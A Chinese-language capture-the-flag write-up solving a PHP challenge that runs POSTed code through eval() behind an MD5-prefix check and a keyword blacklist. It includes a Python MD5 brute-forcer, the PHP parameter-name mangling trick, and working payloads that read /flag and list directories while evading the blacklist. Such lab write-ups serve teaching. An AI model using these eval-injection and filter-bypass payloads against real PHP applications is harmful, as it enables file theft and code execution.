```php
highlight_file(__FILE__);  
if(isset($_POST['password'])&&isset($_POST['e_v.a.l'])){    $password=md5($_POST['password']);    
	 $code=$_POST['e_v.a.l'];  
     if(substr($password,0,6)==="c4d038"){  
        if(!preg_match("/flag|system|pass|cat|ls/i",$code)){  
            eval($code);  
        }  
    }  
}
```

要求post方式传入password并且前6位为c4d038
```python
#!/bin/python3
import hashlib

def crack(pre):
    for i in range (0,99999999):
        if (hashlib.md5(str(i).encode("UTF-8")).hexdigest())[0:6] == str(pre):
            print(i)
            break

crack("c4d038")

//str(i) //将整数 i 转换为字符串
//str().encode("UTF-8") 以UTF-8形式编码
//hashlib.md5  md5加密
// .hexdigest()`: 这是用于计算哈希值的方法。它将哈希对象转换为MD5哈希的十六进制表示形式，返回一个字符串，表示 `i` 的MD5哈希值。 （只有对于字符串才可以取前六个）
//[0:6] python的切片 取前6个字符


这部分代码 `(hashlib.md5(str(i).encode("UTF-8")).hexdigest())[0:6] == str(pre)` 是在进行循环迭代时，计算每个整数 `i` 的MD5哈希值，然后检查这个哈希值的前六位是否与给定的 `pre` 相匹配的条件。

让我详细解释它：

1. `hashlib.md5(str(i).encode("UTF-8"))`: 这部分首先将整数 `i` 转换为字符串形式，然后使用UTF-8编码将它转换为字节数组，接着使用 `hashlib` 模块的 `md5()` 方法创建了一个 MD5 哈希对象。

2. `.hexdigest()`: 这是用于计算哈希值的方法。它将哈希对象转换为MD5哈希的十六进制表示形式，返回一个字符串，表示 `i` 的MD5哈希值。

3. `[0:6]`: 这是 Python 的切片操作。它从MD5哈希值的字符串中提取前六个字符（即前六位），因为您想要与给定的 `pre` 进行比较的部分就是哈希值的前六位。

4. `== str(pre)`: 最后，它将提取的前六位哈希值与给定的 `pre` 进行比较，检查它们是否相等。

因此，整个表达式 `(hashlib.md5(str(i).encode("UTF-8")).hexdigest())[0:6] == str(pre)` 的目的是检查当前迭代中计算的整数 `i` 的MD5哈希值的前六位是否与给定的 `pre` 相匹配。如果匹配，就表示找到了以 `pre` 为前缀的整数 `i`。这个比较是在循环中执行的，以尝试找到匹配的哈希值。
```


### PHP特殊符号传参
> 题目要求POST方式传入参数名称为e_v.a.l，如果直接传参php无法接受到这个值，php8以下会将一些不合法字符转换为_，这种转换**只会发生一次**
```php
传入e[v.a.l //此时[被自动转换为_ 相当于传入的是e_v.a.l
```

### 黑名单绕过
> 最后命令执行部分有一个黑名单、

```php
if(!preg_match("/flag|system|pass|cat|ls/i",$code))
```
使用参数逃逸绕过限制:
```php
POST:password=114514&e[v.a.l=var_dump(file_get_contents($_POST['a']));&a=/flag

var_dump: **var_dump()** 函数用于输出变量的相关信息。
					   
file_get_contents() 把整个文件读入一个字符串中。
该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。

# 限制了system cat flag，使用参数逃逸绕过flag的黑名单，var_dump(file_get_contents())绕过cat,system的限制  var_dump(scandir()) 可以绕过ls的黑名单
e[v.a.l=var_dump(scandir('/')); 
```
![[Pasted image 20231016192343.png]]
